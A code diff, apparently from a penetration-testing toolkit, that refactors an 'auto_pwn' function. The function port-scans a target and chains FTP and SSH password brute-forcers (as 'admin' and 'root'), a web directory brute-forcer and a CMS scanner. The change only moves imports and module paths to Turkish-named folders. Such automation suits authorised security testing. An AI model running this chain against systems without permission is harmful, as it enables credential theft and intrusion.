@@ -12,9 +12,10 @@ import time
 from concurrent.futures import ThreadPoolExecutor
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-import Notifier
+import Sistem.Bildirim_Sistemi as Notifier
 
 base_dir = os.path.dirname(os.path.abspath(__file__))
+moduller_dir = os.path.dirname(base_dir)
 
 def check_port(ip, port):
     try:
@@ -68,23 +69,23 @@ def auto_pwn(target_ip, wordlist_path=None):
     
     for port in open_ports:
         if port == 21:
-            cmd = [sys.executable, os.path.join(base_dir, "Password Cracking", "FTP_Bruteforce.py"), target_ip, "admin", wordlist_path]
+            cmd = [sys.executable, os.path.join(moduller_dir, "06_Sifre_Kirici_Araclar", "FTP_Bruteforce.py"), target_ip, "admin", wordlist_path]
             out = run_module("FTP_Bruteforce", cmd)
             report += f"--- FTP (21) ---\n{out}\n"
         elif port == 22:
-            cmd = [sys.executable, os.path.join(base_dir, "Password Cracking", "SSH_Bruteforce.py"), target_ip, "root", wordlist_path]
+            cmd = [sys.executable, os.path.join(moduller_dir, "06_Sifre_Kirici_Araclar", "SSH_Bruteforce.py"), target_ip, "root", wordlist_path]
             out = run_module("SSH_Bruteforce", cmd)
             report += f"--- SSH (22) ---\n{out}\n"
         elif port in [80, 8080]:
             url = f"http://{target_ip}:{port}"
             
             # Dir Buster
-            cmd_dir = [sys.executable, os.path.join(base_dir, "Web Exploitation", "Directory_Bruteforcer.py"), url, wordlist_path]
+            cmd_dir = [sys.executable, os.path.join(moduller_dir, "12_Web_Zafiyet_Araclari", "Directory_Bruteforcer.py"), url, wordlist_path]
             out_dir = run_module(f"Directory_Bruteforcer ({port})", cmd_dir)
             report += f"--- DirBuster ({port}) ---\n{out_dir}\n"
             
             # CMS Scanner
-            cmd_cms = [sys.executable, os.path.join(base_dir, "Web Exploitation", "CMS_Scanner.py"), url]
+            cmd_cms = [sys.executable, os.path.join(moduller_dir, "12_Web_Zafiyet_Araclari", "CMS_Scanner.py"), url]
             out_cms = run_module(f"CMS_Scanner ({port})", cmd_cms)
             report += f"--- CMS Scanner ({port}) ---\n{out_cms}\n"
 
